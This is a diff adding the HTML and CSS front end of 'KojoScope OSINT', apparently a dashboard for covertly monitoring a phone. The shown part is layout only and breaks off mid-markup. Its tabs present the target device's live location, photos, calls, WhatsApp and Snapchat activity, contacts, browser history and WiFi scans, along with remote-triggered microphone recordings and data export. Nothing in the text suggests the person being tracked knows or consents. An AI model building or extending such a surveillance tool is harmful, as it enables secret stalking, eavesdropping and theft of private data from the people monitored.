@@ -1,0 +1,3278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>KojoScope OSINT</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<style>
+:root{--bg:#0d1117;--card:#161b22;--border:#30363d;--accent:#ffca28;--text:#c9d1d9;--muted:#8b949e;--danger:#f85149;--success:#3fb950;--radius:8px}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--text);overflow-x:hidden}
+.header{background:var(--card);border-bottom:1px solid var(--border);padding:12px 16px;display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+.header h1{font-size:20px;font-weight:600;color:var(--accent);display:flex;align-items:center;gap:6px}
+.header .status{font-size:14px;padding:3px 10px;border-radius:12px;background:var(--success);color:#000}
+.header .status.warn{background:var(--danger)}
+.header .read-budget{font-size:13px;color:var(--muted);margin-left:auto}
+.device-select{background:var(--bg);color:var(--text);border:1px solid var(--border);padding:4px 10px;border-radius:var(--radius);font-size:15px}
+.map-wrap{position:relative;width:100%}
+#map{width:100%;height:45vh;z-index:1}
+.pb-bar{position:absolute;bottom:0;left:0;right:0;background:linear-gradient(180deg,rgba(13,17,23,.98),rgba(13,17,23,.92));padding:6px 10px;display:flex;align-items:center;gap:4px;z-index:1000;font-size:13px;border-top:1px solid var(--border);flex-wrap:wrap;backdrop-filter:blur(8px);min-height:44px;touch-action:manipulation}
+.pb-grp{display:flex;align-items:center;gap:4px}
+.pb-btn{background:transparent;color:var(--text);border:none;padding:8px 12px;border-radius:8px;cursor:pointer;font-size:18px;transition:all .15s;line-height:1;min-height:36px;min-width:36px;display:flex;align-items:center;justify-content:center;-webkit-tap-highlight-color:transparent;user-select:none}
+.pb-btn:hover{background:rgba(255,202,40,.15);color:var(--accent)}
+.pb-btn:active{transform:scale(.92)}
+.pb-btn.pb-on{background:var(--accent);color:#000}
+.pb-btn.pb-on:hover{background:#e6b520}
+.pb-div{width:1px;height:26px;background:var(--border);flex-shrink:0;margin:0 4px}
+.pb-bar select{background:var(--bg);color:var(--text);border:1px solid var(--border);font-size:13px;padding:6px 8px;border-radius:6px;cursor:pointer;min-height:34px;-webkit-appearance:none;appearance:none;padding-right:20px;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='8' height='6' fill='%238b949e'%3E%3Cpath d='M0 0l4 6 4-6z'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 6px center}
+.pb-bar select:focus{outline:none;border-color:var(--accent)}
+.pb-bar input[type=range]{width:100%;height:8px;accent-color:var(--accent);cursor:pointer;min-width:80px;border-radius:4px}
+.pb-bar input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:18px;height:18px;border-radius:50%;background:var(--accent);border:2px solid var(--bg);box-shadow:0 1px 4px rgba(0,0,0,.5)}
+.pb-bar input[type=range]::-moz-range-thumb{width:18px;height:18px;border-radius:50%;background:var(--accent);border:2px solid var(--bg);box-shadow:0 1px 4px rgba(0,0,0,.5)}
+.pb-scrub{flex:3;min-width:100px;padding:2px 0}
+.pb-slab{display:flex;justify-content:space-between;font-size:11px;color:var(--muted);margin-top:2px}
+.pb-cnt{font-size:14px;font-weight:600;color:var(--accent);white-space:nowrap;letter-spacing:.3px}
+.pb-meta{font-size:12px;color:var(--muted);white-space:nowrap}
+.pb-info{display:flex;flex-direction:column;align-items:center;gap:1px}
+.pg{display:flex;gap:4px;align-items:center;font-size:12px}
+.pg input[type=number]{width:32px;background:var(--bg);color:var(--text);border:1px solid var(--border);padding:4px 3px;font-size:13px;border-radius:5px;text-align:center;min-height:30px}
+.pg select{font-size:12px;padding:4px 6px;min-height:30px}
+.pg button{padding:4px 10px;font-size:12px;background:var(--border);color:var(--text);border:none;border-radius:5px;cursor:pointer;transition:.1s;min-height:30px}
+.pg button:hover{background:var(--accent);color:#000}
+.pg button:active{transform:scale(.95)}
+.pb-range{font-size:12px;color:var(--muted);white-space:nowrap;display:flex;align-items:center;gap:3px}
+@media(max-width:720px){
+.pb-bar{padding:5px 8px;gap:3px}
+.pb-btn{padding:7px 9px;font-size:17px;min-height:34px;min-width:34px}
+.pb-div{display:none}
+.pb-mobile-hide{display:none!important}
+.pb-bar select{font-size:12px;padding:4px 16px 4px 6px;min-height:30px}
+.pb-bar input[type=range]{height:10px}
+.pb-bar input[type=range]::-webkit-slider-thumb{width:22px;height:22px}
+.pb-bar input[type=range]::-moz-range-thumb{width:22px;height:22px}
+.pb-scrub{flex:2;min-width:60px}
+.pb-cnt{font-size:12px}
+.pb-meta{font-size:10px}
+.pb-slab{font-size:10px}
+.pg input[type=number]{width:26px;font-size:12px;min-height:26px}
+.pg select{font-size:11px;min-height:26px;padding:3px 14px 3px 4px}
+.pg button{padding:3px 7px;font-size:11px;min-height:26px}
+.pb-range{font-size:10px}
+}
+@media(max-width:480px){
+.pb-bar{padding:5px 6px;gap:2px;min-height:0}
+.pb-btn{padding:6px 7px;font-size:16px;min-height:32px;min-width:32px;border-radius:6px}
+.pb-btn:active{transform:scale(.88)}
+.pb-bar select{font-size:11px;padding:3px 14px 3px 5px;min-height:26px}
+.pb-bar input[type=range]{height:10px;min-width:40px}
+.pb-bar input[type=range]::-webkit-slider-thumb{width:22px;height:22px}
+.pb-bar input[type=range]::-moz-range-thumb{width:22px;height:22px}
+.pb-scrub{flex:1 1 100%;min-width:0;order:10;margin:2px 0 1px;padding:0}
+.pb-slab{font-size:10px}
+.pb-cnt{font-size:12px}
+.pb-meta{font-size:10px}
+.pb-grp.pb-info{gap:0;flex-direction:row;align-items:center}
+.pb-info .pb-meta{margin-left:4px}
+.pg{gap:2px}
+.pg input[type=number]{width:26px;font-size:11px;min-height:24px;padding:2px}
+.pg select{font-size:10px;min-height:24px;padding:2px 12px 2px 3px}
+.pg button{padding:2px 6px;font-size:10px;min-height:24px}
+button#loadHistoryBtn{padding:5px 7px;font-size:15px;min-height:30px;min-width:30px}
+.pb-range{display:none!important}
+}
+.tabs{display:flex;gap:0;background:var(--card);border-bottom:1px solid var(--border);overflow-x:auto;scrollbar-width:none}
+.tab-btn{padding:10px 16px;font-size:15px;border:none;background:none;color:var(--muted);cursor:pointer;white-space:nowrap;border-bottom:2px solid transparent;transition:.15s}
+.tab-btn.active{color:var(--accent);border-bottom-color:var(--accent)}
+.tab-btn:hover{color:var(--text)}
+.content{padding:12px;max-height:50vh;overflow-y:auto}
+.content>div{display:none}
+.content>div.active{display:block}
+.card{background:var(--card);border-left:3px solid var(--accent);padding:12px;margin-bottom:10px;border-radius:0 var(--radius) var(--radius) 0}
+.card .time{font-size:13px;color:var(--muted)}
+.card .label{font-size:14px;color:var(--muted);margin-bottom:2px}
+.card .value{font-size:16px;font-weight:500}
+.coord-box{font-family:'SF Mono','Fira Code',monospace;font-size:22px;color:var(--accent);background:var(--bg);padding:8px 12px;border-radius:var(--radius);margin:8px 0}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.photo-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:5px}
+.photo-grid .pwrap{background:var(--card);border-radius:6px;overflow:hidden;cursor:pointer;position:relative;aspect-ratio:1;border:1px solid var(--border);transition:border-color .15s}
+.photo-grid .pwrap:hover{border-color:var(--accent)}
+.photo-grid img{width:100%;height:100%;object-fit:cover;display:block}
+.photo-grid .pcap{position:absolute;bottom:0;left:0;right:0;background:linear-gradient(transparent,rgba(0,0,0,.85));padding:5px 7px;font-size:11px;color:#eee;opacity:0;transition:opacity .2s;pointer-events:none}
+.photo-grid .pwrap:hover .pcap{opacity:1}
+.photo-grid .pcap .ptime{font-size:10px;color:#bbb;margin-top:1px}
+.photo-day{border-top:1px solid var(--border);padding-top:10px;margin-bottom:8px}
+.photo-day:first-child{border-top:none}
+.photo-day-header{font-size:14px;color:var(--accent);font-weight:600;margin-bottom:6px;display:flex;justify-content:space-between}
+.photo-day-count{font-weight:400;color:var(--muted);font-size:13px}
+.load-more-btn{width:100%;padding:10px;text-align:center;font-size:14px;color:var(--accent);background:var(--card);border:1px solid var(--border);border-radius:var(--radius);cursor:pointer;margin-top:6px;transition:.1s}
+.load-more-btn:hover{background:var(--accent);color:#000}
+.load-more-btn:disabled{opacity:.4;cursor:default}
+.bar-chart{margin:6px 0}
+.bar-row{display:flex;align-items:center;gap:8px;margin-bottom:4px;font-size:14px}
+.bar-fill{height:18px;background:var(--accent);border-radius:3px;min-width:2px}
+.bar-label{width:100px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex-shrink:0}
+.bar-val{color:var(--muted);font-size:13px;width:50px;text-align:right}
+table{width:100%;border-collapse:collapse;font-size:14px}
+th{text-align:left;padding:6px 4px;color:var(--muted);border-bottom:1px solid var(--border)}
+td{padding:6px 4px;border-bottom:1px solid var(--border)}
+.filter-chips{display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap}
+.chip{padding:4px 10px;border-radius:12px;font-size:13px;border:1px solid var(--border);background:var(--bg);color:var(--muted);cursor:pointer}
+.chip.active{background:var(--accent);color:#000;border-color:var(--accent)}
+.lightbox{position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:9999;display:none;justify-content:center;align-items:center;cursor:zoom-out}
+.lightbox.open{display:flex}
+.lightbox img{max-width:95vw;max-height:95vh;object-fit:contain}
+.voice-card{background:var(--card);padding:12px;margin-bottom:8px;border-radius:var(--radius);border-left:3px solid var(--accent)}
+.voice-card .vname{font-size:15px;font-weight:500;color:var(--text)}
+.voice-card .vmeta{font-size:13px;color:var(--muted);margin-top:2px}
+.voice-card audio{width:100%;margin-top:6px}
+.tl-group{margin-bottom:12px}
+.tl-day{font-size:14px;color:var(--accent);font-weight:600;padding:4px 0 6px;border-bottom:1px solid var(--border);margin-bottom:6px}
+.tl-summary{font-size:13px;color:var(--muted);margin-bottom:6px;display:flex;gap:12px;flex-wrap:wrap}
+.app-daily{display:flex;gap:8px;align-items:flex-end;margin-bottom:12px;overflow-x:auto;padding-bottom:4px}
+.app-daily-bar{display:flex;flex-direction:column;align-items:center;min-width:40px;gap:2px}
+.app-daily-bar .bar{width:24px;border-radius:3px 3px 0 0;min-height:4px}
+.app-daily-bar .label{font-size:11px;color:var(--muted);text-align:center}
+.app-period-btn{padding:3px 10px;font-size:13px;border:1px solid var(--border);background:var(--bg);color:var(--muted);border-radius:10px;cursor:pointer}
+.app-period-btn.active{background:var(--accent);color:#000;border-color:var(--accent)}
+.alert-banner{padding:8px 12px;font-size:14px;display:none}
+.alert-banner.show{display:block}
+.alert-banner.warn{background:rgba(255,202,40,.15);color:var(--accent);border-bottom:1px solid rgba(255,202,40,.3)}
+.alert-banner.error{background:rgba(248,81,73,.15);color:var(--danger);border-bottom:1px solid rgba(248,81,73,.3)}
+@media(min-width:768px){
+body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;height:100vh}
+.header{grid-column:1/-1}
+.sidebar{grid-column:1;overflow:hidden;display:flex;flex-direction:column;border-right:1px solid var(--border)}
+.map-wrap{grid-column:2;grid-row:2}
+#map{height:100%}
+.content{max-height:none;flex:1}
+.tabs+.content{flex:1;overflow-y:auto}
+}
+.pb-stats{margin-bottom:6px}
+.pb-stats .card{padding:8px 12px!important}
+.pb-day{font-size:13px;color:var(--accent);font-weight:600;padding:6px 0 4px;border-bottom:1px solid var(--border);margin:8px 0 4px}
+.pb-day:first-child{margin-top:0}
+.pb-point-list{display:flex;flex-direction:column;gap:2px;max-height:38vh;overflow-y:auto}
+.pb-point-row{display:flex;align-items:center;gap:6px;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:12px;border-left:2px solid transparent;transition:.07s;background:transparent}
+.pb-point-row:hover{background:var(--card);border-left-color:var(--accent)}
+.pb-point-row.pb-point-active{background:var(--card);border-left-color:var(--accent)}
+.pb-point-row .ppt-ts{color:var(--accent);font-weight:500;min-width:68px;flex-shrink:0;font-size:11px}
+.pb-point-row .ppt-coord{color:var(--muted);font-family:monospace;font-size:10px;min-width:95px;flex-shrink:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.pb-point-row .ppt-meta{color:var(--muted);font-size:10px;display:flex;gap:4px;margin-left:auto;opacity:0.7}
+.pb-point-row.pb-point-active .ppt-meta{opacity:1;color:var(--text)}
+.pb-point-row.pb-ha{border-left-color:var(--success)!important;background:rgba(63,185,80,.08)!important}
+.pb-point-row.pb-ha .ppt-ts{color:var(--success)!important}
+.pb-point-row.pb-ha .ppt-meta{opacity:1!important;color:var(--success)!important}
+.pb-point-row .ppt-addr{color:var(--muted);font-size:9px;width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;opacity:0.5;padding-left:2px;margin-top:-1px}
+.pb-point-row .ppt-addr.loading{opacity:0.3;font-style:italic}
+.pb-point-row .ppt-addr.done{opacity:0.7}
+.map-hide{display:none!important}
+@media(max-width:480px){
+.pb-point-row{padding:3px 6px;font-size:11px}
+.pb-point-row .ppt-ts{min-width:55px;font-size:10px}
+.pb-point-row .ppt-coord{min-width:70px;font-size:9px}
+.pb-point-row .ppt-meta{font-size:9px}
+}
+.leaflet-control-layers{background:#161b22!important;color:#c9d1d9!important;border:1px solid #30363d!important;border-radius:8px!important;padding:8px 12px!important}
+.leaflet-control-layers label{color:#c9d1d9!important;font-size:15px!important;cursor:pointer!important}
+.leaflet-control-layers input{margin-right:8px!important;accent-color:#ffca28!important}
+.leaflet-control-layers a{color:#ffca28!important}
+.wifi-signal{display:inline-flex;gap:2px;align-items:center;min-width:24px}
+.wifi-signal .bar{width:3px;border-radius:1px;background:var(--border)}
+.wifi-signal .bar.on{background:var(--accent)}
+.wifi-signal .bar.on.s3{background:var(--success)}
+.wifi-signal .bar.on.s1{background:var(--danger)}
+.wifi-latest{background:rgba(63,185,80,.06)!important;border-left-color:var(--success)!important}
+.wifi-ap-row{display:flex;gap:8px;align-items:center;padding:4px 0;border-bottom:1px solid var(--border);font-size:13px}
+.wifi-ap-row:last-child{border-bottom:none}
+.wifi-ap-row .wifi-ssid{min-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.wifi-ap-row .wifi-bssid{color:var(--muted);font-family:monospace;font-size:12px;min-width:80px}
+.wifi-ap-row .wifi-rssi{color:var(--muted);min-width:45px}
+.wifi-ap-row .wifi-band{color:var(--muted);min-width:40px}
+.wifi-ap-row .wifi-cap{color:var(--muted);font-size:11px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:120px}
+.wifi-prev-header{cursor:pointer;user-select:none;display:flex;align-items:center;gap:6px}
+.wifi-prev-header:hover{color:var(--accent)}
+.wifi-prev-body{overflow:hidden;transition:max-height .2s}
+.wifi-prev-body.closed{max-height:0!important}
+</style>
+</head>
+<body>
+<div class="header">
+<h1>&#x1F6F0; KojoScope</h1>
+<select class="device-select" id="deviceSelect"><option value="">No devices</option></select>
+<span class="status" id="statusDot">&#x25CF; Live</span>
+<span class="read-budget" id="readBudget"></span>
+<span class="read-budget" id="queueBadge" style="color:var(--accent);cursor:pointer;margin-left:6px" title="Pending offline queue size">&#x1F4E2; 0</span>
+</div>
+<div class="alert-banner" id="alertBanner"></div>
+<div class="sidebar">
+<div class="tabs" id="tabBar">
+<button class="tab-btn active" data-tab="live">&#x1F4CD; Live</button>
+<button class="tab-btn" data-tab="photos">&#x1F4F8; Photos</button>
+<button class="tab-btn" data-tab="timeline">&#x1F4AC; Timeline</button>
+<button class="tab-btn" data-tab="calls">&#x1F4DE; Calls</button>
+<button class="tab-btn" data-tab="apps">&#x1F4CA; Apps</button>
+<button class="tab-btn" data-tab="geofence">&#x2699; Geo</button>
+<button class="tab-btn" data-tab="fcm">&#x1F4E1; Sync</button>
+<button class="tab-btn" data-tab="contacts">&#x1F4CD; Contacts</button>
+<button class="tab-btn" data-tab="voice">&#x1F3A4; Voice</button>
+<button class="tab-btn" data-tab="remote">&#x1F3A4; Remote</button>
+<button class="tab-btn" data-tab="playback">&#x25B6; Playback</button>
+<button class="tab-btn" data-tab="insights">&#x1F4CA; Insights</button>
+<button class="tab-btn" data-tab="storage">&#x1F4E6; Storage</button>
+<button class="tab-btn" data-tab="browser">&#x1F310; Browser</button>
+<button class="tab-btn" data-tab="permissions">&#x1F512; Perms</button>
+<button class="tab-btn" data-tab="wifi">&#x1F4E1; WiFi</button>
+<button class="tab-btn" data-tab="logcat">&#x1F4DD; Logcat</button>
+<button class="tab-btn" data-tab="health">&#x1F4AA; Health</button>
+</div>
+<div class="content" id="tabContent">
+<div class="active" id="tab-live">
+<div class="grid">
+<div><div class="label">Latitude</div><div class="value" id="latVal">--</div></div>
+<div><div class="label">Longitude</div><div class="value" id="lngVal">--</div></div>
+<div><div class="label">Accuracy</div><div class="value" id="accVal">--</div></div>
+<div><div class="label">Speed</div><div class="value" id="spdVal">--</div></div>
+<div><div class="label">Device</div><div class="value" id="devVal">--</div></div>
+<div><div class="label">Battery</div><div class="value" id="batVal">--</div></div>
+<div><div class="label">WiFi</div><div class="value" id="wifiVal">-- <span id="wifiApCount" style="font-size:13px;color:var(--muted);font-weight:400"></span></div></div>
+<div><div class="label">Last Seen</div><div class="value" id="seenVal">--</div></div>
+<div><div class="label">Updated</div><div class="value" id="updatedVal" style="font-size:13px">--</div></div>
+</div>
+<div class="coord-box" id="coordBox" style="cursor:pointer" title="Click to copy">--</div>
+<div class="label">Address</div>
+<div class="value" id="addrVal" style="font-size:15px;color:var(--muted)">--</div>
+<div class="card" style="border-left-color:var(--success);margin-top:8px;padding:8px 12px">
+  <div style="display:flex;gap:12px;flex-wrap:wrap;font-size:14px">
+    <div><span class="label" style="font-size:12px">Active App</span><br><span id="activeAppVal" style="font-weight:500">--</span></div>
+    <div><span class="label" style="font-size:12px">Last Screen On</span><br><span id="lastScreenOnVal" style="font-weight:500">--</span></div>
+    <div><span class="label" style="font-size:12px">Steps Today</span><br><span id="liveStepsVal" style="font-weight:500">--</span></div>
+    <div><span class="label" style="font-size:12px">Carrier</span><br><span id="liveCarrierVal" style="font-weight:500">--</span></div>
+    <div><span class="label" style="font-size:12px">Network</span><br><span id="liveNetworkVal" style="font-weight:500">--</span></div>
+    <div><span class="label" style="font-size:12px">SIM</span><br><span id="liveSimVal" style="font-weight:500">--</span></div>
+  </div>
+</div>
+</div>
+<div id="tab-photos">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
+<span style="font-size:16px;font-weight:500">&#x1F4F8; Photos <span id="photoCount" style="font-weight:400;color:var(--muted);font-size:14px"></span></span>
+<div style="display:flex;gap:6px">
+<span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="loadAllPhotos()">&#x1F4C2; Load All</span>
+<span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="photoOffset=0;cachedPhotos={};pollPhotos()">&#x1F504; Refresh</span>
+</div>
+</div>
+<div id="photoGrid" class="photo-grid"><div class="label" style="margin:20px 0">&#x1F4F8; Click the Photos tab to load</div></div>
+<div id="loadMoreContainer"></div>
+</div>
+<div id="tab-timeline">
+<div class="filter-chips" id="timelineChips">
+<span class="chip active" data-filter="all" data-label="All">All</span>
+<span class="chip" data-filter="location" data-label="&#x1F4CD; Location">&#x1F4CD; Location</span>
+<span class="chip" data-filter="call" data-label="&#x1F4DE; Call">&#x1F4DE; Call</span>
+<span class="chip" data-filter="whatsapp" data-label="&#x1F4AC; WhatsApp">&#x1F4AC; WhatsApp</span>
+<span class="chip" data-filter="snapchat" data-label="&#x1F4F8; Snapchat">&#x1F4F8; Snapchat</span>
+</div>
+<input type="text" id="timelineSearch" placeholder="&#x1F50D; Search contacts, numbers, messages..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:14px;margin-bottom:8px">
+<div id="timelineList"></div>
+</div>
+<div id="tab-calls"><table><thead><tr><th>Time</th><th>Number</th><th>Duration</th><th>Type</th></tr></thead><tbody id="callsBody"></tbody></table></div>
+<div id="tab-apps"><div class="app-period" style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap">
+<span class="app-period-btn active" data-period="today">Today</span>
+<span class="app-period-btn" data-period="yesterday">Yesterday</span>
+<span class="app-period-btn" data-period="week">7-day avg</span>
+<span class="app-period-btn" data-period="mostRecent">⏱ Recent</span>
+  </div><div style="font-size:12px;color:var(--muted);margin-bottom:6px" id="appsSyncInfo"></div><div id="appsChart"></div></div>
+<div id="tab-geofence">
+<div class="card" style="border-left-color:var(--accent);padding:12px;margin-bottom:10px">
+  <div style="font-size:15px;font-weight:500;margin-bottom:6px">&#x1F3E0; Home Location</div>
+  <div id="homeInfo" style="font-size:13px;color:var(--muted);margin-bottom:6px">--</div>
+  <div style="display:flex;gap:6px;flex-wrap:wrap">
+    <button class="chip" id="setHomeBtn" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:13px">&#x1F4CD; Set current as Home</button>
+    <button class="chip" id="removeHomeBtn" style="border-color:var(--danger);color:var(--danger);font-size:13px">Remove Home</button>
+  </div>
+</div>
+<div id="geofenceList"></div></div>
+<div id="tab-fcm">
+<div class="card" style="border-left-color:var(--accent);padding:12px">
+  <div style="font-size:15px;font-weight:500;margin-bottom:8px">&#x1F4E1; Remote Sync Trigger</div>
+  <div style="font-size:13px;color:var(--muted);margin-bottom:8px">Writes a sync request flag to the device's RTDB path. The foreground service picks it up within 15 seconds and runs an immediate full sync.</div>
+  <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px">
+    <button class="chip" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:13px" onclick="sendFcmPush()">&#x1F504; Trigger Sync Now</button>
+    <button class="chip" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:13px" onclick="toggleAutoFcm()" id="autoFcmBtn">&#x23F1; Auto-Sync: OFF</button>
+  </div>
+  <div style="font-size:12px;color:var(--muted)" id="fcmTokenInfo">No FCM token registered yet</div>
+  <div style="font-size:12px;color:var(--muted);margin-top:4px" id="fcmLastPush">Last trigger: --</div>
+</div>
+<div class="card" style="border-left-color:var(--success);padding:12px;margin-top:8px">
+  <div style="font-size:15px;font-weight:500;margin-bottom:4px">&#x1F4E2; Offline Queue</div>
+  <div style="font-size:13px;color:var(--muted);margin-bottom:6px">Location data buffered on device when offline — flushed to RTDB every 5min when connected</div>
+  <div style="display:flex;gap:12px;align-items:center;flex-wrap:wrap">
+    <span style="font-size:22px;font-weight:700;color:var(--accent)" id="offlineQueueCount">--</span>
+    <span style="font-size:13px;color:var(--muted)">pending entries</span>
+  </div>
+</div>
+</div>
+<div id="tab-contacts">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+  <span style="font-size:16px;font-weight:500">&#x1F4CD; Contacts</span>
+  <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="pollContacts()">&#x1F504; Refresh</span>
+</div>
+<input type="text" id="contactsSearch" placeholder="&#x1F50D; Search contacts..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:14px;margin-bottom:8px">
+<div id="contactsList"><div class="label">No contacts synced yet</div></div>
+</div>
+<div id="tab-voice"><div id="voiceNotesList"><div class="label">No voice notes yet</div></div></div>
+<div id="tab-remote">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
+<span style="font-size:16px;font-weight:500">&#x1F3A4; Remote Recordings</span>
+<span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="pollRemoteRecordings()">&#x1F504; Refresh</span>
+</div>
+<div style="font-size:13px;color:var(--muted);margin-bottom:8px">
+On-demand mic recordings triggered from the dashboard. Segments are auto-assembled into a single playable file.
+</div>
+<div id="remoteRecordingsList"><div class="label">No remote recordings yet</div></div>
+</div>
+<div id="tab-insights">
+<div class="grid" style="grid-template-columns:1fr 1fr 1fr;margin-bottom:10px">
+<div><div class="label">&#x1F4CA; Today's Activity</div><div class="value" id="inTodayActivity">--</div></div>
+<div><div class="label">&#x1F4CD; Unique Locations</div><div class="value" id="inUniqueLocs">--</div></div>
+<div><div class="label">&#x1F4DE; Calls Today</div><div class="value" id="inCallsToday">--</div></div>
+</div>
+<div class="card" style="border-left-color:var(--accent)">
+<div class="label">&#x1F504; Location Changes (last 24h)</div>
+<div id="inLocChart" style="height:50px;display:flex;align-items:flex-end;gap:3px;margin-top:6px"></div>
+</div>
+<div class="card" style="border-left-color:var(--accent)">
+<div class="label">&#x1F4CA; Top Contacts</div>
+<div id="inTopContacts" style="margin-top:4px"><span class="label">Load timeline to analyze</span></div>
+</div>
+<div class="card" style="border-left-color:var(--accent)">
+<div class="label">&#x1F4C5; Activity Heatmap (hour of day)</div>
+<div id="inHeatmap" style="display:flex;gap:2px;margin-top:6px;flex-wrap:wrap"></div>
+</div>
+<button class="chip" style="background:var(--accent);color:#000;margin-top:8px" onclick="exportData()">&#x1F4E5; Export Data (CSV)</button>
+</div>
+<div id="tab-storage">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+  <span style="font-size:16px;font-weight:500">&#x1F4E6; Storage & Cleanup</span>
+  <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="refreshStorage()">&#x1F504; Refresh</span>
+</div>
+<div id="storageOverview" style="margin-bottom:14px"></div>
+<div style="border-top:1px solid var(--border);padding-top:10px">
+  <div style="font-size:15px;font-weight:500;margin-bottom:8px">&#x1F9F9; Cleanup Actions</div>
+  <div id="cleanupActions" style="display:flex;flex-direction:column;gap:6px"></div>
+</div>
+</div>
+<div id="tab-browser">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+  <span style="font-size:16px;font-weight:500">&#x1F310; Browser History</span>
+  <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="pollBrowserHistory()">&#x1F504; Refresh</span>
+</div>
+<div class="filter-chips" id="browserChips" style="margin-bottom:6px">
+  <span class="chip active" data-browser="all">All</span>
+  <span class="chip" data-browser="chrome">Chrome</span>
+  <span class="chip" data-browser="firefox">Firefox</span>
+  <span class="chip" data-browser="samsung">Samsung</span>
+  <span class="chip" data-browser="huawei">Huawei</span>
+  <span class="chip" data-browser="other">Other</span>
+</div>
+<input type="text" id="browserSearch" placeholder="&#x1F50D; Search titles, URLs..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:14px;margin-bottom:8px">
+<div id="browserList"><div class="label">No browsing history yet</div></div>
+</div>
+<div id="tab-permissions">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+  <span style="font-size:16px;font-weight:500">&#x1F512; App Permissions</span>
+  <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="pollPermissions()">&#x1F504; Refresh</span>
+</div>
+<input type="text" id="permSearch" placeholder="&#x1F50D; Search app or permission..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:14px;margin-bottom:8px">
+<div style="font-size:12px;color:var(--muted);margin-bottom:6px" id="permSyncInfo"></div>
+<div id="permList"><div class="label">No permissions data yet</div></div>
+</div>
+<div id="tab-wifi">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+<span style="font-size:16px;font-weight:500">&#x1F4E1; WiFi Scan History</span>
+<span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="pollWifiScans()">&#x1F504; Refresh</span>
+</div>
+<div style="font-size:13px;color:var(--muted);margin-bottom:8px">Live scans every 60s from device. Latest scan shown at top with full detail.</div>
+<input type="text" id="wifiSearch" placeholder="&#x1F50D; Filter by SSID or BSSID..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:14px;margin-bottom:8px">
+<div id="wifiList"><div class="label">No WiFi scan data yet</div></div>
+</div>
+<div id="tab-logcat">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
+<span style="font-size:16px;font-weight:500">&#x1F4DD; Logcat</span>
+<div style="display:flex;gap:6px">
+<span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="pollLogcat()">&#x1F504; Refresh</span>
+<span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="clearLogcat()">&#x1F5D1; Clear</span>
+</div>
+</div>
+<div style="display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap">
+<select id="logcatFilter" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 8px;border-radius:6px;font-size:13px">
+<option value="">All</option>
+<option value="E">Errors only</option>
+<option value="W">Warnings</option>
+<option value="D">Debug</option>
+<option value="I">Info</option>
+<option value="V">Verbose</option>
+</select>
+<input type="text" id="logcatSearch" placeholder="&#x1F50D; Search..." style="flex:1;min-width:150px;padding:6px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:6px;font-size:13px">
+</div>
+<div id="logcatContent" style="font-family:monospace;font-size:12px;line-height:1.4;max-height:60vh;overflow-y:auto;background:#0d1117;padding:8px;border-radius:6px;border:1px solid var(--border)"><div class="label" style="color:var(--muted)">Click Refresh to load logcat</div></div>
+</div>
+<div id="tab-health">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
